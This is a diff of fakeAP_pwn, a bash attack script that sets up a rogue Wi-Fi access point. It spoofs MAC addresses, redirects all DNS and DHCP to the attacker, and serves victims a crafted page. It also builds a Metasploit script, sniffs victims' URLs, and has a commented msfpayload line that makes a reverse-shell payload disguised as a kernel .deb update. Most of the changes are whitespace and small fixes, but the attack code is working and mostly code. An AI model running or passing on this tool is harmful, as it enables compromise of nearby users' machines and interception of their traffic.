@@ -14,7 +14,7 @@
 #        Doesn't work too well!                                                                #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
-# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
+# v0.4 - hostapd          - Add support for hostapd & Hardware AP                              #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                           crafted page without affecting any other clients who are browsing  #
 #                           Create a captive portal with:                                      #
@@ -123,10 +123,12 @@ function help() {
    -?  ---  This screen
 
  Known issues:
+   - airbase-ng is broken
+	airbase-ng has many bugs 
    - Slowness
         Try a different MTU value?
    - No IP
-        Try...
+        Get the latest version of dhcp3-server
    - Wireless N
         Doesn't work too well!
 "
@@ -203,7 +205,7 @@ fi
 
 if [ "$(id -u)" != "0" ]; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup; fi
 
-if [ "$transparent" == "true" ]; then
+if [ "$transparent" == "true" ] ; then
     int=$(ifconfig | grep $interface | awk '{print $1}')
     if [ "$int" != "$interface" ]; then
     echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
@@ -212,22 +214,22 @@ if [ "$transparent" == "true" ]; then
   fi
 fi
 int=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
-if [ "$int" != "$wifiInterface" ]; then
+if [ "$int" != "$wifiInterface" ] ; then
    echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isn't correct." 1>&2
-   if [ "$debug" == "true" ]; then iwconfig; fi
+   if [ "$debug" == "true" ] ; then iwconfig; fi
    cleanup
 fi
 
-if [ "$transparent" == "true" ]; then
+if [ "$transparent" == "true" ] ; then
    if [ -z "$ourIP" ]; then
-      if [ "$verbose" == "2" ]; then echo "[i] Command: dhclient $interface"; fi
+      if [ "$verbose" == "2" ] ; then echo "[i] Command: dhclient $interface"; fi
       $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "dhclient $interface"
       sleep 3
       export ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
       if [ -z "$ourIP" ]; then
          echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"
          export pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
-         if [ -n "$pidcheck" ]; then
+         if [ -n "$pidcheck" ] ; then
             kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
          fi
          cleanup
@@ -281,8 +283,8 @@ if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 stop"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                 # Stopping apache Web Server
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/wicd stop"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'WICD Service'" -e "/etc/init.d/wicd stop"                       # Stopping WICD
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: service network-manager stop"; fi
-#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu)
+if [ "$verbose" == "2" ] ; then echo "[i] Command: service network-manager stop"; fi
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu)
 
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterface"; fi
@@ -294,7 +296,7 @@ sleep 1
 if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface up"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "ifconfig $wifiInterface up"
 export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
-if [ -n "$pidcheck2" ]; then
+if [ -n "$pidcheck2" ] ; then
    if [ "$verbose" == "2" ] ; then echo "[i] Command: kill $pidcheck2"; fi
    kill $pidcheck2 # Kill everything on the wifi interface before starting monitor mode, to prevent interference
 fi
@@ -302,23 +304,23 @@ if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng start $wifiInterfac
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" -e "airmon-ng start $wifiInterface" &
 sleep 5
 int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
-if [ "$int" != "$monitorInterface" ]; then
+if [ "$int" != "$monitorInterface" ] ; then
    sleep 5 # Some people need to wait a little bit longer, some don't. Don't force the ones that don't need it!
    int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
    if [ "$int" != "$monitorInterface" ]; then
       echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
-      if [ "$debug" == "true" ]; then iwconfig; fi
+      if [ "$debug" == "true" ] ; then iwconfig; fi
       cleanup
    fi
 fi
 
-if [ "$fakeAPmac" == "random" ]; then
+if [ "$fakeAPmac" == "random" ] ; then
    echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up"; fi
    $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up" &
    sleep 2
 fi
-if [ "$fakeAPmac" == "set" ]; then
+if [ "$fakeAPmac" == "set" ] ; then
    echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up"; fi
    $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up" &
@@ -535,7 +537,7 @@ echo "
 
 print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
-if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi
+if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi
 
 # dhcpd script
 if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
@@ -557,13 +559,13 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option netbios-name-servers 10.0.0.99; # The NetBIOS name server (WINS)
 }" > /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
-if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dhcp; fi
+if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
 
 # dns script
 if [ "$transparent" != "true" ]; then
    echo "10.0.0.1 *" > /tmp/fakeAP_pwn.dns
    if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.dns"; fi
-   if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
+   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
 fi
 
 # apache - virtual host
@@ -624,7 +626,7 @@ echo "<VirtualHost *:80>
 </VirtualHost>
 </IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
-if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
+if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
 #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"; fi
@@ -707,7 +709,7 @@ if [ "$verbose" == "2" ] ;
  then echo "[i] Command: dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
 $xterm -geometry 75x3+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
 sleep 2
-if [ -z "$(pgrep dhcpd3)" ]; then # check if dhcpd3 server is running
+if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
    echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
    if [ "$verbose" == "2" ] ; then echo "[i] Command: killall xterm"; fi
    killall xterm # Because cleanup doesnt do it!
@@ -753,7 +755,7 @@ echo -e "\e[01;33m[+]\e[00m Target connect!"
  targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
 echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"
 
-if [ "$transparent" == "true" ]; then
+if [ "$transparent" == "true" ] ; then
    echo -e "\e[01;32m[>]\e[00m Give our target their inter-webs back..."
    iptables --flush
    iptables --table nat --flush
@@ -764,13 +766,13 @@ if [ "$transparent" == "true" ]; then
    iptables --table nat -A POSTROUTING -o $interface -j MASQUERADE
 fi
 
-if [ "$payload" == "wkv" ]; then
+if [ "$payload" == "wkv" ] ; then
    echo -e "\e[00;31m[i] Opening file...."
    cat /tmp/fakeAP_pwn.wkv
    sleep 1
 fi
 
-if [ "$extras" == "true" ]; then
+if [ "$extras" == "true" ] ; then
    echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: urlsnarf -i at0"; fi
    $xterm -geometry 75x10+10+0    -T "fakeAP_pwn v$version - URLs"          -e "urlsnarf -i at0" &                # URLs
